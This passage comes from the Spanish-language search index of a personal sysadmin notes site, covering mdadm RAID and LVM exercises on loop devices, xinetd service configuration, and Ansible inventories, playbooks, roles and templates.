/boot/grub2/ /mnt/dades/d1 cp -r /boot/grub2/ /mnt/dades/d2 cp -r /boot/grub2/ /mnt/dades/d3 Extender VG a las 2 raids vgextend mydisc /dev/md/raid2 Extender partici\u00f3n sistemas lvextend -L +100M /dev/mydisc/sistema resize2fs /dev/mydisc/sistema Extraer raid1 primaria # probocar fllo en disco mdadm /dev/md/raid1 --fail /dev/loop0 # mover datos al segundo raid pvmove /dev/md/raid1 /dev/md/raid2 # quitar vprimer raid del VG vgreduce mydisc /dev/md/raid1 # parar raid1 mdadm --stop /dev/md/raid1","title":"Raid"},{"location":"sistemas/raid/#raid","text":"","title":"Raid"},{"location":"sistemas/raid/#modos-de-raid","text":"","title":"Modos de raid"},{"location":"sistemas/raid/#firmware","text":"El modo de raid firmware es el raid basado en la BIOS, la propia BIOS tiene su controladora para gestionar la raid .","title":"Firmware"},{"location":"sistemas/raid/#hardware","text":"El modo Hardware, consiste en una tarjeta pinchada en la placa que controla la raid.","title":"Hardware"},{"location":"sistemas/raid/#software","text":"El modo Software es el propio sistema operativo que gestiona la raid.","title":"Software"},{"location":"sistemas/raid/#tipo-de-raid","text":"tipo de raid wikipedia","title":"Tipo de raid"},{"location":"sistemas/raid/#raid-software","text":"assemble construye la raid a partir de los superbloques build crea la raid sin a\u00f1adir la marca de superbloque al disco create crea la raid a\u00f1adiendo superbloques en sus discos","title":"Raid software"},{"location":"sistemas/raid/#niveles-de-raid","text":"Calculadora raid Nivel n\u00ba discos n\u00ba discos que pueden fallar capacidad capacidad leer y escribir R0 2 0 100% excelente R1 2 max 1 50% L.MuyBuena / E.Buena R5 3 min 1 67% - 94% L.Muy buena / E.Buena R6 4 min 2 50% - 88% L.Buena / E.Buena R10 4 min 1 por cada mirror 50% L.Muy buena / E.Buena R50 6 min 1 por cada mirror 67% - 94% L.Excelente / E.Muy buena R60 8 min 2 por cada mirror 50% - 88% L.Muy buena / E.Buena","title":"Niveles de raid"},{"location":"sistemas/raid/#raid-0","text":"Escribe y lee en los discos a la vez reparti\u00e9ndose la faena, resultado una escritura y lectura excelente. Lo malo que no tiene margen de error, si falla un disco pierdes los datos.","title":"Raid 0"},{"location":"sistemas/raid/#raid-1","text":"Escribe en los 2 discos a la vez por si falla 1 tener el otro de backup.","title":"Raid 1"},{"location":"sistemas/raid/#raid-5","text":"Hace una paridad de datos cada 2 bits genera un tercero de seguridad por si falla alg\u00fan disco.","title":"Raid 5"},{"location":"sistemas/raid/#raid-6","text":"Hace lo mismo que raid 5 pero generando 2 bits de paridad, por lo tanto hay posibilidad de que fallen 2 discos sin perder datos.","title":"Raid 6"},{"location":"sistemas/raid/#raid-10","text":"Son dos raid 1 unidas por una raid 0 , nivel de seguridad alto 1 disco por mirror pero se reduce la capacidad total de almacenamiento al 50% total.","title":"Raid 10"},{"location":"sistemas/raid/#raid-50","text":"Dos raid 5 unidas por raid 0 velocidad excelente de lectura con nivel de seguridad alto de 2 discos de fallo.","title":"Raid 50"},{"location":"sistemas/raid/#raid-60","text":"Dos raid 6 unidas por raid 0 m\u00e1xima seguridad en raid posibilidad de que fallen 4 discos dos por cada raid 6. una probabilidad muy peque\u00f1a.","title":"Raid 60"},{"location":"sistemas/raid/#crear-raid","text":"sudo mdadm --create /dev/md0 --level = 1 --raid-devices = 3 /dev/loop0 /dev/loop1 /dev/loop2 sudo mdadm --create /dev/md/dades --level = 1 --raid-devices = 2 /dev/loop0 /dev/loop1 --spare-devices = 2 /dev/loop2 /dev/loop3 Al crear la raid inserta un peque\u00f1o bloque de datos en cada disco para gestionar la raid.","title":"Crear raid"},{"location":"sistemas/raid/#ver-informacion-raid","text":"sudo mdadm --detail /dev/md0 # ver estado del raid sudo mdadm --detail --scan # ver si existe alguna raid sudo mdadm --examine /dev/loop0 # ver datos del bloque raid en disco sudo mdadm --query /dev/loop0 sudo mdadm --query /dev/md0 cat /proc/mdstat # ver estado de raid","title":"Ver Informaci\u00f3n Raid"},{"location":"sistemas/raid/#extraer-disco","text":"sudo mdadm /dev/md0 --fail /dev/loop1 sudo mdadm /dev/md0 --remove /dev/loop1","title":"Extraer disco"},{"location":"sistemas/raid/#anadir-disco","text":"sudo mdadm --manage /dev/md0 --add /dev/loop1 En este paso si los discos de la raid tienen datos, tardara en a\u00f1adirse por que tiene que sincronizarse.","title":"A\u00f1adir disco"},{"location":"sistemas/raid/#anadir-spare","text":"Spare son los discos de reserva, cuando falla un disco de datos, este se empieza a sincronizar autom\u00e1ticamente. sudo mdadm /dev/md0 --add-spare /dev/loop2","title":"A\u00f1adir Spare"},{"location":"sistemas/raid/#parar-raid","text":"Para, parar la raid a de estar desmontada del sistema de archivos. sudo mdadm --stop /dev/md0 # parar raid md0 sudo mdadm --stop --scan # para todas las raid","title":"Parar Raid"},{"location":"sistemas/raid/#guardar-raid","text":"sudo mdadm --examine --scan > /etc/mdadm.conf","title":"Guardar raid"},{"location":"sistemas/raid/#reconstruir-raid","text":"Como se guardan datos de la raid en cada disco es posible reconstruir una raid autom\u00e1ticamente. sudo mdadm --assemble --scan # automatico, si existe /etc/mdadm.conf no escaneara todos los discos. sudo mdadm --assemble /dev/md0 --run /dev/loop0 /dev/loop1 /dev/loop2 # indicando discos sudo mdadm --assemble /dev/md0 # siempre que exista el archivo /etc/mdadm.conf y este md0 dentro","title":"Reconstruir raid"},{"location":"sistemas/raid/#limpiar-superbloque","text":"sudo mdadm --zero-superblock /dev/loop0","title":"Limpiar superbloque"},{"location":"sistemas/raid/#reshape","text":"","title":"Reshape"},{"location":"sistemas/raid/#aumentar-discos","text":"Aumentar a 3 discos y a\u00f1adir el tercero. sudo mdadm --grow /dev/md/raid1 --raid-devices 3 --add /dev/loop2","title":"Aumentar discos"},{"location":"sistemas/raid/#cambiar-nivel-de-raid","text":"De level 1 a level 5, lvel 1 solo puede tener 2 discos. sudo mdadm --grow /dev/md/raid1 --level 5","title":"Cambiar nivel de raid"},{"location":"sistemas/raid/#aumentar-tamano","text":"sudo mdadm --grow /dev/md/raid1 --size = max # si esta montada se tendr\u00e1 que espandir el sistem de ficheros sudo resize2fs /dev/md127","title":"Aumentar tama\u00f1o"},{"location":"sistemas/raid/#raid-y-lvm","text":"Ejercicio practico: un raid 1 de 2v discos de 500 un raid 1 de 2v discos de 500 primer raid crear pv y vg lv de 200 sistema y 300 dades montar incorpoprar al vg el segundo raid incrementar sistema +100 provocar fail raid1 eliminar vel primer raid del vg","title":"Raid y LVM"},{"location":"sistemas/raid/#crear-discos","text":"dd if = /dev/zero of = disc1.img bs = 1k count = 500k dd if = /dev/zero of = disc2.img bs = 1k count = 500k dd if = /dev/zero of = disc3.img bs = 1k count = 500k dd if = /dev/zero of = disc4.img bs = 1k count = 500k losetup /dev/loop0 disc1.img losetup /dev/loop1 disc2.img losetup /dev/loop2 disc3.img losetup /dev/loop3 disc4.img","title":"Crear discos"},{"location":"sistemas/raid/#crear-raids","text":"mdadm --create /dev/md/raid1 --level 1 --raid-devices 2 /dev/loop0 /dev/loop1 mdadm --create /dev/md/raid2 --level 1 --raid-devices 2 /dev/loop2 /dev/loop3","title":"Crear raids"},{"location":"sistemas/raid/#crear-marca-pv-y-vg","text":"pvcreate /dev/md/raid1 pvcreate /dev/md/raid2 vgcreate mydisc /dev/md/raid2","title":"Crear marca PV y VG"},{"location":"sistemas/raid/#crear-lvs","text":"crear montar y a\u00f1adir datos lvcreate -L 200M -n sistema /dev/mydisc lvcreate -L 100M -n dades /dev/mydisc mkfs.ext4 /dev/mydisc/sistema mkfs.ext4 /dev/mydisc/dades mount /dev/mydisc/sistema /mnt/sistema mount /dev/mydisc/dades /mnt/dades cp -r /boot/grub2/ /mnt/sistema/s1 cp -r /boot/grub2/ /mnt/sistema/s2 cp -r /boot/grub2/ /mnt/dades/d1 cp -r /boot/grub2/ /mnt/dades/d2 cp -r /boot/grub2/ /mnt/dades/d3","title":"Crear LVs"},{"location":"sistemas/raid/#extender-vg-a-las-2-raids","text":"vgextend mydisc /dev/md/raid2","title":"Extender VG a las 2 raids"},{"location":"sistemas/raid/#extender-particion-sistemas","text":"lvextend -L +100M /dev/mydisc/sistema resize2fs /dev/mydisc/sistema","title":"Extender  partici\u00f3n sistemas"},{"location":"sistemas/raid/#extraer-raid1-primaria","text":"# probocar fllo en disco mdadm /dev/md/raid1 --fail /dev/loop0 # mover datos al segundo raid pvmove /dev/md/raid1 /dev/md/raid2 # quitar vprimer raid del VG vgreduce mydisc /dev/md/raid1 # parar raid1 mdadm --stop /dev/md/raid1","title":"Extraer raid1 primaria"},{"location":"sistemas/xinetd/","text":"xinetd Xinetd es un servicio standalone, que hace de escucha de otros servicios. Xinetd siempre esta escuchando y cuando le llegan peticiones, arranca el servicio demandado y redirige la petici\u00f3n. Esto sirve para bajar el consumo de la cpu, ya que si no estuviera estar\u00edan todos los servicios encendidos continuamente. los archivos de demonios dentro de xinetd se encuentran en el directorio /etc/xinetd.d y se specifica que es UDP o TCP con stream tcp, dgram udp. -rw------- 1 root root 1156 Mar 12 18 :23 chargen-dgram -rw------- 1 root root 1158 Mar 12 18 :24 chargen-stream -rw------- 1 root root 1156 Mar 12 18 :23 daytime-dgram -rw------- 1 root root 1158 Mar 12 18 :23 daytime-stream ... Dato: hoy en d\u00eda las m\u00e1quinas tienen suficiente cpu para no utilizar este servicio, pero en el caso de correr una m\u00e1quina con pocos recursos es recomendable. Ejemplo de servicio xinetd /etc/xinetd.d/pop3 service pop3 { socket_type = stream wait = no user = root server = /usr/sbin/ipop3d log_on_success += HOST DURATION log_on_failure += HOST disable = no } Opciones disable : Indica que un servicio espere apagado o no. yes permanece apagado hasta que se le necesite. wait : Indica si el servicio es multithread. opci\u00f3n yes --> no es multithread y no --> es multithread Un servicio multithread es el que acepta m\u00faltiples peticiones simultaneas, crea un fork de su servicio principal y sigue escuchando. Un servicio que no es multithread solo puede aceptar una petici\u00f3n al mismo tiempo, si hay mas peticiones ser\u00e1n rechazadas por estar en uso. server : Demonio a arrancar cuando reciba una petici\u00f3n. user : Usuario con el que se ejecuta el demonio. instances : N\u00famero de conexiones simultaneas que acepta. only_from : Hosts remotos desde donde se puede conectar no_access : Hosts remotos desde donde se puede conectar Tanto en only_from y no_acces se puede especificar el host como 192.168.0.1 | 192.168.2.0 | 192.168.0.2/24 | .domain.com los 0 a la derecha se trata como comod\u00edn, es decir es lo mismo 192.168.2.0 que 192.168.2.0/24 . access_times : rango de tiempo en el que esta permitido el acceso. Las horas pueden variar de 0 a 23 y los minutos de 0 a 59. 8:00-14:00 cps : N\u00famero de conexiones por segundo redirect : ip y puerto a la que redirigir la petici\u00f3n bind : interficie por la que escucha la petici\u00f3n port : puerto de la interficie que escucha la petici\u00f3n Existen mas opciones, estas son las m\u00e1s usadas y b\u00e1sicas, para mas informaci\u00f3n man xinetd.conf Bind Bind indica la interficie por donde escuchar 0.0.0.0 son todas las interficies del equipo, 127.0.0.1 interficie loopback. # escucha en todas las interficies service http-switch { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 13 bind = 0 .0.0.0 port = 1013 user = nobody } # escucha solo en localhost service http-switch { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 13 bind = 127 .0.0.1 port = 2013 user = nobody } Redirect La redirecci\u00f3n no tiene por que ser a una interficie local, tambi\u00e9n acepta dispositivos externos. # redirecciona a localhost:80 service http-bis { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 80 bind = 0 .0.0.0 port = 1080 user = nobody } # redirecciona a una web externa service http-bis { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = www.escoladeltreball.org 80 bind = 0 .0.0.0 port = 1080 user = nobody } Only_from/no_access # se permite el acceso solo a la ip 172.17.0.3 { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 13 bind = 127 .0.0.1 port = 2007 user = nobody only_from = 172 .17.0.3 } # permitir acceso a una red menos un equipo de la misma { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 13 bind = 172 .17.0.2 port = 14 user = nobody only_from = 172 .17.0.0/24 no_access = 172 .17.0.1 } access_times # permitir acceso de 8 a 13 { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 13 bind = 172 .17.0.2 port = 14 user = nobody access_times = 8 :00-13:00 } instances # permitir solo 2 conexiones simultaneas { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 7 bind = 172 .17.0.2 port = 8 user = nobody instances = 2 } cpu # establecer 2 conexiones m\u00e1ximo por segundo y una espera de 20s para la proxima { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 7 bind = 172 .17.0.2 port = 8 user = nobody cps = 2 20 }","title":"xinetd"},{"location":"sistemas/xinetd/#xinetd","text":"Xinetd es un servicio standalone, que hace de escucha de otros servicios. Xinetd siempre esta escuchando y cuando le llegan peticiones, arranca el servicio demandado y redirige la petici\u00f3n. Esto sirve para bajar el consumo de la cpu, ya que si no estuviera estar\u00edan todos los servicios encendidos continuamente. los archivos de demonios dentro de xinetd se encuentran en el directorio /etc/xinetd.d y se specifica que es UDP o TCP con stream tcp, dgram udp. -rw------- 1 root root 1156 Mar 12 18 :23 chargen-dgram -rw------- 1 root root 1158 Mar 12 18 :24 chargen-stream -rw------- 1 root root 1156 Mar 12 18 :23 daytime-dgram -rw------- 1 root root 1158 Mar 12 18 :23 daytime-stream ... Dato: hoy en d\u00eda las m\u00e1quinas tienen suficiente cpu para no utilizar este servicio, pero en el caso de correr una m\u00e1quina con pocos recursos es recomendable. Ejemplo de servicio xinetd /etc/xinetd.d/pop3 service pop3 { socket_type = stream wait = no user = root server = /usr/sbin/ipop3d log_on_success += HOST DURATION log_on_failure += HOST disable = no }","title":"xinetd"},{"location":"sistemas/xinetd/#opciones","text":"disable : Indica que un servicio espere apagado o no. yes permanece apagado hasta que se le necesite. wait : Indica si el servicio es multithread. opci\u00f3n yes --> no es multithread y no --> es multithread Un servicio multithread es el que acepta m\u00faltiples peticiones simultaneas, crea un fork de su servicio principal y sigue escuchando. Un servicio que no es multithread solo puede aceptar una petici\u00f3n al mismo tiempo, si hay mas peticiones ser\u00e1n rechazadas por estar en uso. server : Demonio a arrancar cuando reciba una petici\u00f3n. user : Usuario con el que se ejecuta el demonio. instances : N\u00famero de conexiones simultaneas que acepta. only_from : Hosts remotos desde donde se puede conectar no_access : Hosts remotos desde donde se puede conectar Tanto en only_from y no_acces se puede especificar el host como 192.168.0.1 | 192.168.2.0 | 192.168.0.2/24 | .domain.com los 0 a la derecha se trata como comod\u00edn, es decir es lo mismo 192.168.2.0 que 192.168.2.0/24 . access_times : rango de tiempo en el que esta permitido el acceso. Las horas pueden variar de 0 a 23 y los minutos de 0 a 59. 8:00-14:00 cps : N\u00famero de conexiones por segundo redirect : ip y puerto a la que redirigir la petici\u00f3n bind : interficie por la que escucha la petici\u00f3n port : puerto de la interficie que escucha la petici\u00f3n Existen mas opciones, estas son las m\u00e1s usadas y b\u00e1sicas, para mas informaci\u00f3n man xinetd.conf","title":"Opciones"},{"location":"sistemas/xinetd/#bind","text":"Bind indica la interficie por donde escuchar 0.0.0.0 son todas las interficies del equipo, 127.0.0.1 interficie loopback. # escucha en todas las interficies service http-switch { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 13 bind = 0 .0.0.0 port = 1013 user = nobody } # escucha solo en localhost service http-switch { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 13 bind = 127 .0.0.1 port = 2013 user = nobody }","title":"Bind"},{"location":"sistemas/xinetd/#redirect","text":"La redirecci\u00f3n no tiene por que ser a una interficie local, tambi\u00e9n acepta dispositivos externos. # redirecciona a localhost:80 service http-bis { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 80 bind = 0 .0.0.0 port = 1080 user = nobody } # redirecciona a una web externa service http-bis { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = www.escoladeltreball.org 80 bind = 0 .0.0.0 port = 1080 user = nobody }","title":"Redirect"},{"location":"sistemas/xinetd/#only_fromno_access","text":"# se permite el acceso solo a la ip 172.17.0.3 { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 13 bind = 127 .0.0.1 port = 2007 user = nobody only_from = 172 .17.0.3 } # permitir acceso a una red menos un equipo de la misma { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 13 bind = 172 .17.0.2 port = 14 user = nobody only_from = 172 .17.0.0/24 no_access = 172 .17.0.1 }","title":"Only_from/no_access"},{"location":"sistemas/xinetd/#access_times","text":"# permitir acceso de 8 a 13 { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 13 bind = 172 .17.0.2 port = 14 user = nobody access_times = 8 :00-13:00 }","title":"access_times"},{"location":"sistemas/xinetd/#instances","text":"# permitir solo 2 conexiones simultaneas { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 7 bind = 172 .17.0.2 port = 8 user = nobody instances = 2 }","title":"instances"},{"location":"sistemas/xinetd/#cpu","text":"# establecer 2 conexiones m\u00e1ximo por segundo y una espera de 20s para la proxima { disable = no type = UNLISTED socket_type = stream protocol = tcp wait = no redirect = 127 .0.0.1 7 bind = 172 .17.0.2 port = 8 user = nobody cps = 2 20 }","title":"cpu"},{"location":"sistemas/automatizacion/ansible/","text":"Ansible https://docs.ansible.com/ansible/latest/modules/modules_by_category.html Intalaci\u00f3n sudo apt install ansible ansible --version Configuraci\u00f3n configurar ssh hacia todos los nodos ssh-copy-id -i user@host Por defecto ansible utiliza python2, si en los host no esta instalado se reproducira un fallo que no encuentra /usr/lib/python se resuelve crando un link en todos los hosts remotos. ln -s /usr/lib/python3 /usr/lib/python windows https://docs.ansible.com/ansible/latest/user_guide/windows_setup.html Para poder controlar remotamente nodos windows con ansible es necesario tener los siguientes modulos de python en el servidor python3-winrm o pywinrm y en el nodo remoto tener powershell 3.0 o superior y habilitiar control remoto con puerto 5986. Una vez habilitada la conexi\u00f3n se tendra que crear un certificado para la conexi\u00f3n o ignorar mediante la siguiente valiable, pasada desde ad-hoc o desde variable de configuraci\u00f3n ansible_winrm_server_cert_validation=ignore Inventory https://docs.ansible.com/ansible/2.3/intro_inventory.html El inventorio es donde se definen los servidores a controlar, estos servidores se pueden agrupar por grupos y especificar argumentos a cada uno de ellos. Inventori /etc/ansible/hosts #green.example.com #blue.example.com #192.168.100.1 #192.168.100.10 # GRUPO de servers -------------------------------- #[dbservers] # #db01.intranet.mydomain.net #db02.intranet.mydomain.net #10.25.1.56 #10.25.1.57 # Here's another example of host ranges, this time there are no # leading 0s: #db-[99:101]-node.example.com localhost ansible_connection = local [ vhosts ] 192 .168.122.200 ansible_user = root # ALIAS ----------------------------------- # Alias a un server # vhost1 ansible_host=192.168.122.200 ansible_user=root # VARIABLES -------------------------------- # Variables a un grupo de servidores [ vhosts:vars ] ansible_python_interpreter = /usr/bin/python3 # SUBGRUPOS ----------------------------------- [ debian ] 192 .168.122.20 [ ubuntu ] 192 .168.122.21 [ apt:children ] ubuntu debian Se pueden separar las variables en ficheros externos al inventario, estos ficheros se escribe en formato yaml . /etc/ansible/group_vars/grupo /etc/ansible/host_vars/servidor /etc/ansible/group_vars/apt ansible_become: True /etc/ansible/host_vars/pc10 ansible_python_interpreter: /usr/bin/python3 Modulos Ansible trabaja con modulos y realizan las tareas que requrimos, tiene una lista muy extensa de m\u00f3dulos donde podemos encrnttrarlos organizados por: cloud, command,clustering, crypto, database, files, monitoring, ... Lista completa aqu\u00ed ad-hoc sintaxis. ansible [opciones] servidores,grupos,all [-m modulo] [-a argumentos] si no se especifica ning\u00fan m\u00f3dulo por defecto utiliza el m\u00f3dulo command Argumentos pas utilizados en ansible: -C # comprobar si puede ser realizada una tarea -u, --user # especificar usuario -i --inventory # especificar inventario -b --become # utilizar sudo -f --fork # numero de nodos controlados simultaniamente (default 5) -k # introducir password --list-hosts # listar gosts, grupos del inventario -m # modulo -a # argumentos Ejemplos: # listartodos los hosts del inventario \u279c ansible ansible -i hosts all --list-hosts hosts ( 2 ) : localhost node # ejecutar un comando directo \u279c ~ ansible localhost -a \"hostname\" localhost | CHANGED | rc = 0 >> pc02 # utilizar modulo ping \u279c ~ ansible 192 .168.122.200 -m ping 192 .168.122.200 | SUCCESS = > { \"changed\" : false, \"ping\" : \"pong\" } # usuario especifico \u279c ~ ansible vhosts -u root -m ping 192 .168.122.200 | SUCCESS = > { \"changed\" : false, \"ping\" : \"pong\" } # filtrar un nodo y comprobar conexi\u00f3n con usario root \u279c ansible ansible --limit node -i hosts all -m ping -u root node | SUCCESS = > { \"changed\" : false, \"ping\" : \"pong\" } # instalaciones # modulo dnf, argumentos intalar vim \u279c ~ ansible 192 .168.122.200 -u root -m dnf -a 'name=vim state=present' 192 .168.122.200 | SUCCESS = > { \"changed\" : false, \"msg\" : \"Nothing to do\" , \"rc\" : 0 , \"results\" : [ \"Installed: vim\" ] } # -K preguntar por contrase\u00f1a # --become utilizar sudo \u279c ~ ansible 192 .168.122.200 -m dnf -a 'name=vim state=present' -b -K SUDO password: 192 .168.122.200 | SUCCESS = > { \"changed\" : false, \"msg\" : \"Nothing to do\" , \"rc\" : 0 , \"results\" : [ \"Installed: vim\" ] } # inventorio especifico -i --inventory \u279c ~ ansible 192 .168.122.200 --inventory my-inventory -m ping 192 .168.122.200 | SUCCESS = > { \"changed\" : false, \"ping\" : \"pong\" } Playbook Playbook es una lista de tareas a realizar en uno o mas nodos remotos, a continuaci\u00f3n se muestra dos ejemplos simples. \u279c ansible cat playbooks/copiarHost.yml --- - name : copiar archivo /etc/hosts hosts : all remote_user : jorge tasks : - name : Copiar /etc/hosts become : true copy : src=/etc/hosts dest=/etc/hosts \u279c ansible cat playbook.yml --- - name : instalar vim hosts : vhosts tasks : - name : instalando vim dnf : name : vim state : present become : true - name : saludar shell : echo \"Hola Mundo\" Para ejecutar un playbook se utiliza la sintaxis ansible-playbook [opciones] playbook.yml \u279c ansible-playbook playbook.yml -K SUDO password: PLAY [ vhosts ] ******************************************************************************************* TASK [ Gathering Facts ] ********************************************************************************** ok: [ 192 .168.122.200 ] TASK [ instalar vim ] ************************************************************************************* ok: [ 192 .168.122.200 ] TASK [ saludar ] ****************************************************************************************** changed: [ 192 .168.122.200 ] PLAY RECAP ********************************************************************************************** 192 .168.122.200 : ok = 3 changed = 1 unreachable = 0 failed = 0 Opciones \u00fatiles para playbooks, tambi\u00e9n se pueden utilizar las opciones de ad-hoc: -i # inventario --syntax-check # verificar sintaxis de playbook --list-task # listar tareas del playbook --step # preguntar en cada tarea si ejecutarla --start-at-task = nombre de la tarea # empezar desde una tarea especifica --forks = / -f # numero de conexiones simultaneas, por defecto 5 Parametros b\u00e1sicos Con hosts especificamos que grupos o servidores ejecutaran la siguientes tareas, el separador es : y es posible utilizar los simbolos & y ! para ambos o negaci\u00f3n. hosts: serverweb # grupo serverweb hosts: serverweb:dbweb # grupo serverweb y dbweb hosts: serverweb:&madrid # nodos que pertenezcan a serverweb y madrid hosts: serverweb:!madrid # nodos del serverweb que no pertenezcan a madrid remote_user: jorge become: true/false ( 1/0 ) # utilizar sudo o no become_user: (usuario) postgres # cambiar de usuario become_method: sudo/su # metodo de cambio check_mode: true/false # mode de prueba Variables # plantilla donde se mostraran variables \u279c ansible cat plantillas/host.j2 {{ miip }} {{ ansible_hostname }} {{ ansible_fqdn }} # playbook donde se especifica una variable y se asigna a una plantilla \u279c ansible cat playbooks/variables.yml --- - name: crear fichero usando variables hosts: localhost connection: local vars: - miip: \"1.2.3.4\" tasks: - name: crear fichero hosts template: src = host.j2 dest = /tmp/hosts # ejeuci\u00f3n \u279c ansible-playbook -i hosts playbooks/variables.yml ... # de la plantilla se a generado este archivo \u279c ansible cat /tmp/hosts 1 .2.3.4 pc02 pc02 # las variables predefinidas de ansible se pueden ver con el modulo setup \u279c ansible localhost -m setup Prioridades de variables definidas de menor prioridad a mayor prioridad. defaults definidas en un rol variables de grupo ( inventario, group_vars/all, group_vars/grupo ) variables de servidor ( inventario, host_vars/servidor ) \"Facts\" del servidor variabes de playbook ( vars_prompt, vars_files ) variable de rol definidas en /roles/rol/vars/main.yml variables de bloque, definidas en tareas parametros de rol, include_params, include_vars set_facts/ registered_vars extra vars, definidas al lanzar la orden de ansible ( siempre gana ) Handlers handlers son tareas que se ejecutan si un trabajo a ido bien y solicita dicha tarea, es decir si se instala nginx reinicia el servicio, si ya esta intalado no se ejecutara el handler. \u279c ansible cat handlers.yml --- - hosts : vhosts become : true tasks : - name : instalar nginx dnf : name : nginx state : present update_cache : true notify : - \"Reiniciar nginx\" handlers : - name : Reiniciar nginx service : name : nginx state : restarted \u279c ansible ansible-playbook handlers.yml -K SUDO password: PLAY [ vhosts ] ******************************************************************************************* TASK [ Gathering Facts ] ********************************************************************************** ok: [ 192 .168.122.200 ] TASK [ instalar nginx ] *********************************************************************************** changed: [ 192 .168.122.200 ] RUNNING HANDLER [ Reiniciar nginx ] *********************************************************************** changed: [ 192 .168.122.200 ] PLAY RECAP ********************************************************************************************** 192 .168.122.200 : ok = 3 changed = 2 unreachable = 0 failed = 0 Include y Role Estos son metodos para desglosar un playbook que es demasiado grande para ser leeible y facilitar la tarea de modificaciones etc.. Include es simplemente el incluir un playbook dentro de otro. Role es una estructura de directorios donde se ordenaran adecuadamente los diferentes archivos yaml para las tareas. site.yml webservers.yml fooservers.yml roles/ common/ tasks/ handlers/ files/ templates/ vars/ defaults/ meta/ webservers/ tasks/ defaults/ meta/ tasks - contiene la lista principal de tareas que debe ejecutar el rol. handlers - contiene handlers, que pueden ser utilizados por este rol o incluso en cualquier lugar fuera de este rol. defaults - variables predeterminadas para el rol (consulta Using Variables para mas informaci\u00f3n). vars - otras variables para el rol (see Using Variables for more information). files - contiene archivos que se pueden implementar a trav\u00e9s de este rol. templates - contiene plantillas que se pueden implementar a trav\u00e9s de este rol. meta - define algunos metadatos para este rol. Include En el siguiente ejemplo es una instalaci\u00f3n simple de el editor vim y un servicio nginx, con el metodo include separando los pasos de nginx en un archivo yaml diferente. --- - name: primer Play hosts: vhosts remote_user: jorge become: true tasks: - name: instalar nginx dnf: name: vim state: present - include: instalar_nginx.yml instalar_nginx.yml --- - name: instalar nginx dnf: name=nginx state=latest - name: instalar servicio service: name=nginx state=started - name: habilitar servicio service: name=nginx enabled=true Role En este ejemplo se muestra una instalaci\u00f3n simple con la estructura de un role \u279c web tree \u251c\u2500\u2500 instalar_con_rol.yml \u2514\u2500\u2500 roles \u2514\u2500\u2500 apache2 \u251c\u2500\u2500 files \u2502 \u2514\u2500\u2500 apache2.conf \u251c\u2500\u2500 handlers \u2502 \u2514\u2500\u2500 main.yml \u251c\u2500\u2500 tasks \u2502 \u2514\u2500\u2500 main.yml \u2514\u2500\u2500 templates \u2514\u2500\u2500 index.html.j2 instalar_con_rol.yml - name: instalar y configurar apache2 hosts: vhosts remote_user: jorge become: true roles: - apache2 roles/apache2/tasks/main.yml - name: instalar apache2 apt: name=apache2 state=latest - name: Iniciar y habilitar servicio service: name=apache2 state=started enabled=true - name: Copiar fichero de configuracion copy: src=apache2.conf dest=/etc/apache2/apache2.conf notify: restart_httpd - name: Copiar fichero index.html template: src=index.html.j2 dest=/var/www/html/index.html roles/apache2/handlers/main.yml - name: restart_httpd service: name=apache2 state=restarted roles/apache2/templates/index.html.j2 Hola al servidor {{ ansible_fqdn }} Templates dentro de una plantilla se pueden especificar las siguientes instrucciones: Expresiones: una {{ variable }} propia o del sistema como {{ ansible_fqdn }} Control: c\u00f3digo con {% ... %} comentarios: {# ... #} {% if ansible_distribution == \"Debian\" %} Muestra s\u00f3lo en sistemas Debian {% endif %} {% for usuario in lista_usuarios %} {{ usuario }} {% endfor %} Condiciones Las condiciones son para ejecutar tareas si dicha condici\u00f3n es cierta, en los siguientes ejemplos se ejecutaran las tareas si las distribuciones remotas son Debian o Ubuntu, esta informaci\u00f3n de las variables de ansible que podemos consultar en ansible hostname -m setup . # condicion para tarea - name: instalar apache2 include: instalar_apache2.yml when: ansible_distribution == \"Debian\" or ansible_distribution == \"Ubuntu\" # condicion para rol - name: instalar y configurar apache2 hosts: vhosts remote_user: jorge become: true roles: - { role: apache2, when: ansible_distribution == \"Debian\" or ansible_distribution == \"Ubuntu\" } bucles los bucles evitan repetir c\u00f3digo y asi reducir el tama\u00f1o del playbook por ejemplo en la instalaci\u00f3n de diversos paquetes. # bucle de tres paquetes a instalar - name: Instalar paquetes apt: name={{ item }} state=latest with_items: - mysql-server - phpmyadmin - php5 # bucle de diccionario creando usuarios - name: Crear usuarios necesarios user: name={{ item.nombre }} groups={{ item.grupo }} with_items: - { nombre: usuario1, grupo: www-data } - { nombre: usuario2, grupo: www-data } # bucle utilizando una variable que es una lista externa - name: Instalar paquetes apt: name={{ item }} state=latest with_items: \"{{ lista_paquetes }}\" defaults/main.yml lista_paquetes: [\"php5\", \"phpmyadmin\", \"mysql-server\"] Register El register permite guardar en una variable el resultado de una acci\u00f3n generada por un modulo de una tarea. - name: playbook para la clase register hosts: localhost tasks: - name: Ejecutar comando uptime command: uptime register: salida_uptime - name: Visualizar variable debug: var=salida_uptime Los valores de retorno son: changed, failed, skipped, rc rc (retorn command) efecto de salida stdout, stderr, stdout_lines, stderr_lines ejemplo: register: salida_uptime.stdout ... TASK [ Visualizar variable ] ****************************************************************************** ok: [ localhost ] = > { \"salida_uptime\" : { \"changed\" : true, \"cmd\" : [ \"uptime\" ] , 